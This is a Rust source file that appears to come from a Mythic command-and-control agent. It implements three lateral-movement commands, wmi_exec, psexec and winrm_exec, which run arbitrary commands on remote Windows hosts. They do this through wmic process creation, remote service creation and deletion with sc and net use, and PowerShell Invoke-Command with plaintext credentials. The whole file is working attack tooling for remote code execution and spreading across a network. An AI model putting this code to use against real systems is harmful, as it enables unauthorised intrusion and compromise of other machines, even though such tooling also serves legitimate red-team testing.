use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::error::Error;
use std::process::Command;
use std::sync::mpsc;

// ============================================================================
// WMI_EXEC
// ============================================================================

#[derive(Deserialize)]
struct WmiExecArgs {
    host: String,
    command: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
}

/// Execute command on remote host via WMI
#[cfg(target_os = "windows")]
pub fn wmi_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: WmiExecArgs = serde_json::from_str(&task.parameters)?;

    let output = if args.username.is_empty() {
        // Execute without credentials
        Command::new("wmic")
            .arg(format!("/node:{}", args.host))
            .arg("process")
            .arg("call")
            .arg("create")
            .arg(&args.command)
            .output()?
    } else {
        // Execute with credentials
        Command::new("wmic")
            .arg(format!("/node:{}", args.host))
            .arg(format!("/user:{}", args.username))
            .arg(format!("/password:{}", args.password))
            .arg("process")
            .arg("call")
            .arg("create")
            .arg(&args.command)
            .output()?
    };

    let result = match output.status.code() {
        Some(0) => {
            format!(
                "WMI execution successful on {}\n\nStdout:\n{}\nStderr:\n{}",
                args.host,
                std::str::from_utf8(&output.stdout)?,
                std::str::from_utf8(&output.stderr)?
            )
        }
        Some(code) => {
            format!(
                "WMI execution failed with status: {}\n\nStdout:\n{}\nStderr:\n{}",
                code,
                std::str::from_utf8(&output.stdout)?,
                std::str::from_utf8(&output.stderr)?
            )
        }
        None => "WMI command was killed by signal.".to_string(),
    };

    tx.send(mythic_success!(task.id, result))?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn wmi_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "wmi_exec is only supported on Windows".to_string()))?;
    Ok(())
}

// ============================================================================
// PSEXEC
// ============================================================================

#[derive(Deserialize)]
struct PsexecArgs {
    host: String,
    command: String,
    #[serde(default = "default_service_name")]
    service_name: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
}

fn default_service_name() -> String {
    "thanatos_svc".to_string()
}

/// Execute command on remote host via service creation (PsExec-style)
#[cfg(target_os = "windows")]
pub fn psexec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: PsexecArgs = serde_json::from_str(&task.parameters)?;

    let mut results = String::new();

    // Step 1: Authenticate if credentials provided
    if !args.username.is_empty() {
        let auth_output = Command::new("net")
            .arg("use")
            .arg(format!("\\\\{}\\IPC$", args.host))
            .arg(format!("/user:{}", args.username))
            .arg(&args.password)
            .output()?;

        results.push_str(&format!(
            "[1] Authentication:\n{}\n\n",
            std::str::from_utf8(&auth_output.stdout)?
        ));

        if !auth_output.status.success() {
            let error = format!(
                "Authentication failed:\n{}",
                std::str::from_utf8(&auth_output.stderr)?
            );
            tx.send(mythic_error!(task.id, error))?;
            return Ok(());
        }
    }

    // Step 2: Create service
    let create_output = Command::new("sc")
        .arg(format!("\\\\{}", args.host))
        .arg("create")
        .arg(&args.service_name)
        .arg("binpath=")
        .arg(format!("cmd /c {}", args.command))
        .output()?;

    results.push_str(&format!(
        "[2] Service creation:\n{}\n",
        std::str::from_utf8(&create_output.stdout)?
    ));

    if !create_output.status.success() {
        let error = format!(
            "{}Service creation failed:\n{}",
            results,
            std::str::from_utf8(&create_output.stderr)?
        );
        tx.send(mythic_error!(task.id, error))?;
        return Ok(());
    }

    // Step 3: Start service
    let start_output = Command::new("sc")
        .arg(format!("\\\\{}", args.host))
        .arg("start")
        .arg(&args.service_name)
        .output()?;

    results.push_str(&format!(
        "[3] Service start:\n{}\n",
        std::str::from_utf8(&start_output.stdout)?
    ));

    // Step 4: Delete service
    std::thread::sleep(std::time::Duration::from_secs(2));
    let delete_output = Command::new("sc")
        .arg(format!("\\\\{}", args.host))
        .arg("delete")
        .arg(&args.service_name)
        .output()?;

    results.push_str(&format!(
        "[4] Service deletion:\n{}\n",
        std::str::from_utf8(&delete_output.stdout)?
    ));

    tx.send(mythic_success!(task.id, results))?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn psexec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "psexec is only supported on Windows".to_string()))?;
    Ok(())
}

// ============================================================================
// WINRM_EXEC
// ============================================================================

#[derive(Deserialize)]
struct WinrmExecArgs {
    host: String,
    command: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
}

/// Execute command on remote host via WinRM
#[cfg(target_os = "windows")]
pub fn winrm_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: WinrmExecArgs = serde_json::from_str(&task.parameters)?;

    let ps_command = if args.username.is_empty() {
        // Execute without credentials
        format!(
            "Invoke-Command -ComputerName {} -ScriptBlock {{ {} }}",
            args.host, args.command
        )
    } else {
        // Execute with credentials
        format!(
            "$pass = ConvertTo-SecureString '{}' -AsPlainText -Force; \
             $cred = New-Object System.Management.Automation.PSCredential ('{}', $pass); \
             Invoke-Command -ComputerName {} -Credential $cred -ScriptBlock {{ {} }}",
            args.password, args.username, args.host, args.command
        )
    };

    let output = Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-Command")
        .arg(&ps_command)
        .output()?;

    let result = match output.status.code() {
        Some(0) => {
            format!(
                "WinRM execution successful on {}\n\nStdout:\n{}\nStderr:\n{}",
                args.host,
                std::str::from_utf8(&output.stdout)?,
                std::str::from_utf8(&output.stderr)?
            )
        }
        Some(code) => {
            format!(
                "WinRM execution failed with status: {}\n\nStdout:\n{}\nStderr:\n{}",
                code,
                std::str::from_utf8(&output.stdout)?,
                std::str::from_utf8(&output.stderr)?
            )
        }
        None => "WinRM command was killed by signal.".to_string(),
    };

    tx.send(mythic_success!(task.id, result))?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn winrm_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "winrm_exec is only supported on Windows".to_string()))?;
    Ok(())
}
